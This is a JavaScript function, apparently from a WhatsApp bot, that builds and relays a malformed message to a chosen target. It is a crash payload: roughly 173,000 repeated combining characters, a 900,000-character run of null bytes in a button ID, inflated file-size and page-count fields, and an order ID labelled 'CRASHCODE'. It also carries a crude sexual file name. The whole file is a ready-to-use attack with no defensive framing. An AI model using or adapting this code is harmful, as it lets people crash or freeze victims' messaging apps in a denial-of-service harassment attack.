async function documentnew(target) {
    const ameliamsg = generateWAMessageFromContent(
        target,
        proto.Message.fromObject({
            ephemeralMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.slideshow",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "974197419741",
                                pageCount: "974197419741",
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: "https://amelia.overload",
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173",
                                contactVcard: true,
                            },
                            hasMediaAttachment: true,
                            jpegThumbnail: "",
                        },
                        orderMessage: {
                            orderId: "CRASHCODE9471",
                            thumbnail: "",
                            itemCount: 999999999,
                            status: "INQUIRY",
                            surface: "CATALOG",
                            message: "https://amelia.overload" + "ꦽ".repeat(103000) + "ꦾ".repeat(70000),
                            orderTitle: "INFINITY",
                            sellerJid: "13135550002@s.whatsapp.net",
                            token: "AR5rcf+zsk2VFs9+l8RFDB34fYqsUY0nQxBMAjE66D0nFQ==",
                            totalAmount1000: "100000019492000",
                            totalCurrencyCode: "IDR",
                            messageVersion: 2,
                        },
                        contextInfo: {
                            stanzaId: amelia.generateMessageTag(),
                            participant: "0@s.whatsapp.net",
                            remoteJid: "status@broadcast",
                            mentionedJid: [target, "13135550002@s.whatsapp.net"],
                            quotedMessage: {
                                buttonsMessage: {
                                    documentMessage: {
                                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                                        mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                                        fileLength: "9999999999999",
                                        pageCount: 3567587327,
                                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                                        fileName: "I,M NEED PUSY",
                                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                                        mediaKeyTimestamp: "1735456100",
                                        contactVcard: true,
                                        caption: "Apakah kmu ayam?"
                                    },
                                    contentText: "Need Duda",
                                    footerText: "Amelia",
                                    buttons: [
                                        {
                                            buttonId: "\u0000".repeat(900000),
                                            buttonText: {
                                                displayText: "Need Duda"
                                            },
                                            type: 1
                                        }
                                    ],
                                    headerType: 3
                                }
                            }
                        }
                    }
                }
            }
        }),
        {
            userJid: target,
            quoted: QBug
        }
    );

    await amelia.relayMessage(target, ameliamsg.message, {
        participant: { jid: target },
        messageId: ameliamsg.key.id
    });
}